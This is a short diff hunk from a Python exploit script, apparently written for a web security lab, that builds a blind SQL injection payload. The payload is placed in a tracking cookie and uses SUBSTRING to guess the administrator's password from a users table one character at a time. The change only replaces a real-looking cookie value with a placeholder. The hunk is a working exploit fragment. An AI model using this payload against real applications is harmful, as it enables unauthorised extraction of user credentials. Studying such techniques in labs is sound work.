@@ -26,7 +26,7 @@ def extract_password():
         for char in chars:
             # Construct the payload
             # This payload checks if the character at position i matches our guess
-            payload = f"16nnojqCWMHT8yMM' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)='{char}'--" # put your tracking cookie here
+            payload = f"place_holder' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)='{char}'--" # place your tracking cooking to place holder
             
             # Set cookies with our payload
             cookies = {
